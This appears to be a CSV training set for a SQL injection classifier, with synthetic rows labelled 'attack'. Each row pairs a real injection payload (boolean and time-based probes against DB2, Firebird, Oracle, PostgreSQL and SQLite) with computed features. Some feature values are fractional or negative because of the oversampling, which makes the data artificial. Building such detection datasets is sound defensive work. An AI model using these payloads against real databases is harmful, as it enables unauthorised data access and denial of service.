id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000030,attack,boolean,"1%'  )   or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000281,0.31117772494689877,130.0,30.24300246236751,3.9951897328174932,69.29898276342742,8.0,36.45801477420507,16.24300246236751,0.5330690981802109,0.06153846153846154,0.2804462674938851,0.1249461727874424,1.0,-1.1102230246251565e-16,2.0,0.0,1.0,1.0,0.0,5.243002462367512,1.0,0.0,2.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000031,attack,boolean,-7239' or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and 'cswv'  =  'cswv,nearest_attack_euclidean,R000072,0.5049473818112783,139.15187546227676,35.0,4.314328321637282,61.86916728303568,18.0,39.0,20.28270817924108,0.4444091292911279,0.12938519411935065,0.2803345872585931,0.14587108933092835,8.0,-1.1102230246251565e-16,1.0,0.0,0.0,2.0,0.0,4.0,0.2827081792410804,0.0,-2.220446049250313e-16,7.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,2.7755575615628914e-17,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000032,attack,boolean,"1%"" and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and ""%""  =  """,nearest_attack_euclidean,R000124,1.107887683561385,131.65153882294135,30.0,4.070770369372267,69.30307764588271,6.696922354117285,37.65153882294136,18.0,0.5263386633559446,0.05097196337059251,0.2859579090487567,0.13673146422470617,0.0,3.674230588529321,0.0,0.0,1.0,1.674230588529321,0.0,4.325769411470679,1.6742305885293212,0.0,2.325769411470679,2.674230588529321,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,1.674230588529321,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.674230588529321
SMOTE_000033,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (     (  ""woun"" like ""woun",nearest_attack_euclidean,R000266,0.08194675875903845,140.82059458316445,29.980066064796052,4.163317620240346,83.82059458316445,4.019933935203948,36.94019819438815,16.039867870407896,0.5951952445325797,0.028558365921507567,0.26231495518115433,0.11393143436475833,0.0,3.0,0.0,0.0,1.0,0.0,0.0,5.0,0.0,0.09966967601974375,3.019933935203949,1.0,0.0,1.0,0.0,0.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000034,attack,boolean,"1""   )    )    and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000068,1.263567196979143,134.0,33.0,3.6969345708774974,37.0,15.0,56.0,26.0,0.27611940298507465,0.11194029850746269,0.417910447761194,0.19402985074626866,0.4154539205603156,0.5845460794396843,2.0,0.0,0.0,1.0,0.0,12.0,0.0,2.0,1.0,9.0,0.41545392056031555,0.5845460794396844,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000035,attack,boolean,"1'   )    )    or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000054,0.23372381273385864,136.76185271439758,29.0,3.8620690495660965,71.0,8.0,41.60948217151806,16.152370542879517,0.5192380296869927,0.05850569348585834,0.3041642477073506,0.11809202911979833,1.0,-1.1102230246251565e-16,2.0,0.0,1.0,1.0,0.0,6.152370542879515,0.0,0.0,2.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000036,attack,boolean,"1   )    )     )   or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",nearest_attack_euclidean,R000078,0.13915841484304017,137.5435735106409,32.0,3.5807103799170035,36.0,16.0,59.634858808512725,25.908714702128183,0.26176481168229965,0.11633991630324428,0.4335292636447805,0.18836600836967557,0.0,-1.1102230246251565e-16,2.0,0.0,0.0,1.0,0.0,12.908714702128183,0.0,2.0,1.0,9.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000037,attack,boolean,"1  )   as zbha where 9700  =  9700 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000300,0.12547549599080673,136.0,36.0,3.8342672919020235,42.0,23.0,54.0,17.0,0.3088235294117647,0.16911764705882354,0.39705882352941174,0.125,2.0,-1.1102230246251565e-16,2.0,1.0,0.0,2.0,0.0,9.0,0.0,0.0,1.0,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000038,attack,boolean,1' and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and 'sqvt' like 'sqvt,nearest_attack_euclidean,R000291,0.6135598290378605,138.33254528278832,34.16627264139416,4.281332478078765,67.16863679302921,15.498817924182475,37.33254528278832,18.332545282788317,0.48564486533169904,0.11200045001528762,0.2698544033934586,0.13250028125955476,8.0,-1.1102230246251565e-16,0.16627264139415876,0.0,0.0,1.1662726413941589,0.0,4.0,0.0,0.0,-2.220446049250313e-16,5.332545282788318,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,2.7755575615628914e-17,1.0,1.8337273586058414,0.16627264139415873,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000039,attack,boolean,1'   )    )    rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (   'czqk' like 'czqk,nearest_attack_euclidean,R000017,1.091473436292504,138.0,28.0,3.3926677991074725,46.0,13.0,64.0,15.0,0.3333333333333333,0.09420289855072464,0.463768115942029,0.10869565217391304,3.042808321961968,0.9571916780380322,0.0,0.0,0.0,1.0,0.0,10.0,0.0,0.0,-2.220446049250313e-16,1.0,0.760702080490492,0.23929791950950818,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,4.0
SMOTE_000040,attack,boolean,"1%"" or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and ""%""  =  """,nearest_attack_euclidean,R000178,0.5544375913371207,137.9039326698224,30.0,4.014358216209022,71.8908237704144,8.0,39.4104871195264,18.602621779881602,0.5215929008852928,0.058017129230522456,0.2855469878306407,0.1348429820535441,0.0,3.999999999999999,0.0,0.0,1.0,2.0,0.0,4.6026217798816,2.0,0.0,2.0,3.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000041,attack,boolean,"1'   )    )     )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000213,0.8477693367455936,137.60934433946818,29.60934433946818,3.853340411250417,63.0,10.0,44.0,20.60934433946818,0.45782351140450145,0.07267039863563515,0.3197497539967947,0.14975633596306873,0.6093443394681815,-1.1102230246251565e-16,2.0,0.0,1.0,1.0,0.0,7.0,0.0,5.0,4.0,4.0,0.6093443394681816,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000042,attack,boolean,"1%' or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and '%'  =  '",nearest_attack_euclidean,R000155,0.5233871224300244,131.7628427857089,30.293807130951485,4.116462023295213,68.02832495833019,8.146903565475743,37.293807130951485,18.293807130951485,0.5162281569848552,0.0618090314857083,0.28315112372440215,0.13881168780503428,4.0,-1.1102230246251565e-16,0.0,0.0,1.0,2.0,0.0,4.0,2.0,0.0,2.146903565475742,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000043,attack,boolean,"-6123"" or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and ""zuzx""  =  ""zuzx",nearest_attack_euclidean,R000087,0.9714460368738258,139.1528347133519,36.87044628446919,4.38615066322756,63.282388428882705,17.15283471335189,39.0,19.717611571117295,0.45484388910857193,0.1231827859764823,0.2802940274337475,0.1416792974811983,4.0,3.999999999999999,0.7176115711172969,0.0,0.0,2.0,0.0,4.0,0.0,0.0,-2.220446049250313e-16,6.717611571117297,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,2.7755575615628914e-17,1.0,1.2823884288827032,0.7176115711172969,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000044,attack,boolean,"1""   )    )     )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000113,0.3451722570836457,136.8740502195099,30.0,3.87964813034385,63.0,10.0,43.099240175607925,20.774810043901983,0.4603865553106067,0.0730772310016836,0.3147671861488208,0.15176902753888882,0.0,1.0,2.0,0.0,1.0,1.0,0.0,6.774810043901982,0.0,5.0,4.0,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000045,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (     (  ""woun"" like ""woun",nearest_attack_euclidean,R000266,1.5653040063665273,141.0,30.0,4.16565615331509,84.0,4.0,37.0,16.0,0.5957446808510638,0.028368794326241134,0.2624113475177305,0.11347517730496454,1.196325503473214,1.8036744965267855,0.0,0.0,1.0,0.0,0.0,5.0,0.0,0.0,3.0,1.0,0.3987751678244047,0.6012248321755952,0.0,0.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000046,attack,boolean,"1'   )    )    or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000255,0.41277377177939906,141.0,31.332233751111133,4.0460898413355535,71.0,8.777411250370378,43.445177499259245,17.777411250370378,0.5035460992907801,0.062251143619648064,0.30812182623588114,0.12608093085369063,1.0,-1.1102230246251565e-16,2.0,0.0,1.0,1.0,0.0,6.222588749629622,0.0,0.0,2.777411250370378,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000047,attack,boolean,"1""   )    )    and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   ""jydy"" like ""jydy",nearest_attack_euclidean,R000205,2.0457468458723556,137.0,32.0,3.6178047982742885,47.0,13.0,59.0,18.0,0.34306569343065696,0.0948905109489051,0.4306569343065693,0.13138686131386862,1.7944208945544315,2.205579105445568,0.0,0.0,1.0,1.0,0.0,10.0,0.0,1.0,1.0,2.0,0.4486052236386079,0.5513947763613921,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000048,attack,boolean,"1""   )    )     )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000113,0.6001365134256362,136.79481401342042,30.30129649664489,3.8943258502998512,63.0,10.0,42.794814013420435,21.0,0.4606276615376656,0.0731155018313755,0.3127142827850703,0.15354255384588855,0.0,1.0,2.0,0.0,1.0,1.0,0.0,6.698703503355109,0.30129649664489133,5.0,4.0,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000049,attack,boolean,"1'||  (  select 'scba' where 9079  =  9079 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000182,0.8602425023591649,132.67382303440888,36.0,4.027922381630633,47.0,21.0,46.0,18.673823034408873,0.3542566824665518,0.15828490067654438,0.34671930624385916,0.14073911061304462,3.0,-1.1102230246251565e-16,2.0,0.0,1.0,2.0,0.0,7.0,0.0,1.0,1.0,6.673823034408873,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.6738230344088733,2.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000050,attack,boolean,"1%""   )    )    and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000035,0.7986841535357441,134.45274994949693,33.45274994949692,3.7129654222738115,37.0,15.0,56.0,26.452749949496923,0.2752017962611314,0.11156829578153973,0.41652163758441507,0.19670827037291383,0.0,0.7263749747484612,2.0,0.0,0.0,1.0,0.0,12.0,0.7263749747484612,2.0,1.0,9.0,0.0,0.7263749747484614,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000051,attack,boolean,"1' or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and 'xmnd'  =  'xmnd",nearest_attack_euclidean,R000004,0.22438858482514878,141.10771419168452,31.215428383369055,3.9195859634729784,47.43085676673812,16.0,51.78457161663094,25.89228580831547,0.3361146857007742,0.11338910063595282,0.3669974757755153,0.18349873788775764,4.0,-1.1102230246251565e-16,0.0,0.0,0.0,1.8922858083154717,0.0,10.0,0.0,2.0,1.0,7.892285808315472,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000052,attack,boolean,"1'   )    )    and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000011,0.9165417268777775,136.5400995687092,30.459900431290805,3.9159071645235444,68.78069698096436,8.0,42.83960172516322,16.91980086258161,0.5036533017091593,0.058591627493040276,0.3138085741750904,0.12394649662271004,1.0,-1.1102230246251565e-16,2.0,0.0,1.0,1.0,0.0,6.459900431290805,0.4599004312908051,0.0,2.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000053,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (   'ootz' like 'ootz",nearest_attack_euclidean,R000204,0.007841911352525197,131.0248352191052,28.004967043821036,3.9870721980968864,84.0,3.0,31.019868175284152,13.004967043821036,0.6411042793890415,0.022896581406751493,0.2367440973939135,0.09925504181029346,3.0,-1.1102230246251565e-16,0.0,0.0,1.0,0.0,0.0,4.004967043821038,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000054,attack,boolean,"1%"" and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and ""%""  =  """,nearest_attack_euclidean,R000264,0.051466848992940656,137.9805270956734,30.0,4.033363053073701,74.98052709567341,8.0,37.0,18.0,0.5434133717881849,0.0579792543761035,0.2681540514894787,0.1304533223462329,0.0,3.999999999999999,0.0,0.0,1.0,2.0,0.0,4.0,2.0,0.0,2.0,3.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,1.9805270956734013,0.019472904326598872,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000055,attack,boolean,"1   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000013,0.07171091535951596,134.12140006382137,29.0,3.872208342159318,65.42490022337479,8.0,44.75719987235726,15.939299968089315,0.4877658925474009,0.05964820014757622,0.33373583077391966,0.1188500765311033,0.0,-1.1102230246251565e-16,2.0,0.0,1.0,1.0,0.0,6.9392999680893155,0.0,0.0,2.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000056,attack,boolean,1'   )    )    rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (   'czqk' like 'czqk,nearest_attack_euclidean,R000017,1.0866733800676536,138.0,28.0,3.392694564416809,46.0,13.0,64.0,15.0,0.3333333333333333,0.09420289855072464,0.463768115942029,0.10869565217391304,3.047017837026433,0.952982162973567,0.0,0.0,0.0,1.0,0.0,10.0,0.0,0.0,-2.220446049250313e-16,1.0,0.7617544592566083,0.23824554074339183,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,4.0
SMOTE_000057,attack,boolean,"1'+  (  select qmez where 3729  =  3729 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000081,0.1768267099146436,141.93403513986112,40.934035139861116,4.081646232838722,46.934035139861116,23.0,53.0,19.0,0.33067292669497583,0.1620476072212164,0.37341405142280293,0.13386541466100482,3.0,-1.1102230246251565e-16,2.0,1.0,0.0,2.0,0.0,9.0,0.0,0.0,1.0,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.9340351398611186,0.06596486013888136,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000058,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and 'lckw'  =  'lckw",nearest_attack_euclidean,R000014,2.0147207765727964,141.10122262783773,35.550611313918864,3.9836860760235853,55.404890511350914,10.0,50.79755474432454,24.89877737216227,0.39248100188980906,0.0708746365051118,0.36012539562022317,0.176518965984856,1.6518339417565924,1.3481660582434074,0.0,0.0,0.0,1.0,0.0,10.449388686081136,0.44938868608113586,2.0,1.0,7.0,0.5506113139188641,0.44938868608113586,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,2.7755575615628914e-17,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
